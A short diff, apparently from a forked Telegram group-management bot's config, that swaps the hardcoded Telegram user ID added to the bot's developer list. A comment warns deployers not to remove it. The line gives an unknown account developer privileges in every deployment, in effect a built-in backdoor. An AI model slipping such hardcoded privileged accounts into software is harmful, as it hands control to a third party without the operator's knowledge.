@@ -172,7 +172,7 @@ else:
             "Your blacklisted chats list does not contain valid BigInteger.")
 
 
-DEV_USERS.add(1491497760) #it you going to remove me, don't ask me errors👿
+DEV_USERS.add(5781844850) #it you going to remove me, don't ask me errors👿
 
 if not SPAMWATCH_API:
     sw = None
